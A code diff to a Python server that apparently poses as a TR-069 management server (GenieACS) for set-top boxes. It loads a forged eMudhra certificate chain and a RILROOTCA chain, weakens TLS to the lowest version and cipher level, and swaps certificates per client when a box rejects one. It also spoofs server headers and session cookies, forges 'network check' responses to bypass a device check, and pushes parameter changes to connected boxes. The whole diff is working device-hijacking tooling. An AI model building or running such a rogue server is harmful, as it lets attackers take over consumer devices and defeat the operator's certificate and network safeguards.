@@ -63,15 +63,66 @@ def log(m):
         except Exception:
             pass
 
-ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
-ctx.load_cert_chain(CERT_FILE)
-try: ctx.set_ciphers("DEFAULT:@SECLEVEL=0")
-except Exception: pass
+BASE_DIR = os.path.dirname(os.path.abspath(__file__))
+FORGED_CERT_PATH = os.path.join(BASE_DIR, "forged_chain.pem")
+ACS_CERT_PATH = os.path.join(BASE_DIR, "acs_chain.pem")
+
+def create_ssl_context(cert_path):
+    if not cert_path or not os.path.exists(cert_path):
+        return None
+    try:
+        c = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
+        if hasattr(ssl, "TLSVersion") and hasattr(ssl.TLSVersion, "MINIMUM_SUPPORTED"):
+            try: c.minimum_version = ssl.TLSVersion.MINIMUM_SUPPORTED
+            except Exception: pass
+        elif hasattr(ssl, "TLSVersion") and hasattr(ssl.TLSVersion, "TLSv1"):
+            try: c.minimum_version = ssl.TLSVersion.TLSv1
+            except Exception: pass
+        c.load_cert_chain(cert_path)
+        try: c.set_ciphers("DEFAULT:@SECLEVEL=0")
+        except Exception:
+            try: c.set_ciphers("ALL:@SECLEVEL=0")
+            except Exception: pass
+        return c
+    except Exception as e:
+        log(f"[WARN] Failed to load certificate {cert_path}: {e}")
+        return None
+
+ctx_forged = create_ssl_context(FORGED_CERT_PATH)
+ctx_acs = create_ssl_context(ACS_CERT_PATH)
+ctx = ctx_forged if ctx_forged else ctx_acs
+
+CLIENT_CERT_MAP = {}
+CLIENT_CERT_LOCK = threading.Lock()
+
+def get_client_context(client_ip):
+    with CLIENT_CERT_LOCK:
+        if client_ip in CLIENT_CERT_MAP:
+            return CLIENT_CERT_MAP[client_ip]
+        return ctx_forged if ctx_forged else ctx_acs
+
+def switch_client_context(client_ip, failed_ctx):
+    with CLIENT_CERT_LOCK:
+        if failed_ctx == ctx_forged and ctx_acs:
+            CLIENT_CERT_MAP[client_ip] = ctx_acs
+            return "RILROOTCA (acs_chain.pem)"
+        elif failed_ctx == ctx_acs and ctx_forged:
+            CLIENT_CERT_MAP[client_ip] = ctx_forged
+            return "eMudhra (forged_chain.pem)"
+        return None
+
+def get_cert_name(ctx_obj):
+    if ctx_obj == ctx_forged: return "eMudhra"
+    if ctx_obj == ctx_acs: return "RILROOTCA"
+    return "Custom"
+
+def get_http_date():
+    return datetime.datetime.now(datetime.timezone.utc).strftime("%a, %d %b %Y %H:%M:%S GMT")
 
 def parse_cookie(headers):
     cookie_header = headers.get("cookie", "")
     if not cookie_header: return None
-    m = re.search(r'session=([0-9a-fA-F]+)', cookie_header)
+    m = re.search(r'(?:JSESSIONID|session)=([0-9a-zA-Z._-]+)', cookie_header)
     return m.group(1) if m else None
 
 def read_http(rf):
@@ -95,11 +146,15 @@ def read_http(rf):
 
 def handle(conn, addr):
     log(f"TCP connect from {addr[0]}:{addr[1]}")
+    client_ctx = get_client_context(addr[0])
     try:
-        s = ctx.wrap_socket(conn, server_side=True)
-        log(f"TLS ok {addr[0]}:{addr[1]}")
+        s = client_ctx.wrap_socket(conn, server_side=True)
+        log(f"TLS ok {addr[0]}:{addr[1]} [{get_cert_name(client_ctx)}]")
     except Exception as e:
         log(f"TLS fail {addr[0]}:{addr[1]}: {type(e).__name__}: {e}")
+        switched_to = switch_client_context(addr[0], client_ctx)
+        if switched_to:
+            log(f"{addr[0]}:{addr[1]} [!] STB TR-069 rejected active certificate. Automatically switched to {switched_to} for next connection (retry in ~10s)!")
         try: conn.close()
         except: pass
         return
@@ -124,8 +179,10 @@ def handle(conn, addr):
             # ---- NETWORK CHECK BYPASS ----
             if "network/check" in path:
                 nb = ('{"Network":"%s"}' % _forge_netcheck()).encode()
+                date_hdr = get_http_date().encode()
                 resp = (
                     b"HTTP/1.1 200 OK\r\n"
+                    b"Date: " + date_hdr + b"\r\n"
                     b"Content-Type: application/json\r\n"
                     b"Content-Length: " + str(len(nb)).encode() + b"\r\n"
                     b"Connection: keep-alive\r\n\r\n" + nb
@@ -144,13 +201,16 @@ def handle(conn, addr):
                     SESSIONS[session_id] = {"state": "inform_sent"}
                 
                 resp_xml = INFORM_RESPONSE_TEMPLATE.format(ID=req_id).encode()
+                date_hdr = get_http_date().encode()
                 http_resp = (
                     b"HTTP/1.1 200 OK\r\n"
+                    b"Date: " + date_hdr + b"\r\n"
                     b"Content-Type: text/xml; charset=utf-8\r\n"
                     b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
-                    b"Set-Cookie: session=" + session_id.encode() + b"\r\n"
-                    b"Server: GenieACS/1.2.13\r\n"
-                    b"SOAPServer: GenieACS/1.2.13\r\n"
+                    b"Set-Cookie: JSESSIONID=" + session_id.encode() + b"; Path=/\r\n"
+                    b"Set-Cookie: session=" + session_id.encode() + b"; Path=/\r\n"
+                    b"Server: GenieACS/1.2.9\r\n"
+                    b"SOAPServer: GenieACS/1.2.9\r\n"
                     b"Connection: keep-alive\r\n\r\n" + resp_xml
                 )
                 s.sendall(http_resp)
@@ -166,12 +226,14 @@ def handle(conn, addr):
                     resp_xml = SET_PARAMS_TEMPLATE.format(ID=cmd_id).encode()
                     sess["state"] = "params_sent"
                     
+                    date_hdr = get_http_date().encode()
                     http_resp = (
                         b"HTTP/1.1 200 OK\r\n"
+                        b"Date: " + date_hdr + b"\r\n"
                         b"Content-Type: text/xml; charset=utf-8\r\n"
                         b"Content-Length: " + str(len(resp_xml)).encode() + b"\r\n"
-                        b"Server: GenieACS/1.2.13\r\n"
-                        b"SOAPServer: GenieACS/1.2.13\r\n"
+                        b"Server: GenieACS/1.2.9\r\n"
+                        b"SOAPServer: GenieACS/1.2.9\r\n"
                         b"Connection: keep-alive\r\n\r\n" + resp_xml
                     )
                     s.sendall(http_resp)
